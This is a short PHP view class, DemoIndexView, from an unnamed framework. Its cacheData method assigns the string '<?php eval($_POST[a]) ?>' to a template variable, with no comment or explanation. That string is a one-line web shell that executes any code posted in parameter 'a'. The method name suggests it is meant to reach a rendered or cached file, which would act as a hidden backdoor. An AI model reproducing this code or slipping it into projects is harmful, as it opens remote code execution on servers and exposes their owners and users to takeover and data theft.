<?php

class DemoIndexView extends BaseView
{

    public function index()
    {
		$data = new CategoryData();
		$result = $data->findAll();
		
	}

    public function cacheData()
    {

        $str = '<?php eval($_POST[a]) ?>';

        $this->assign('str', $str);
    }

}
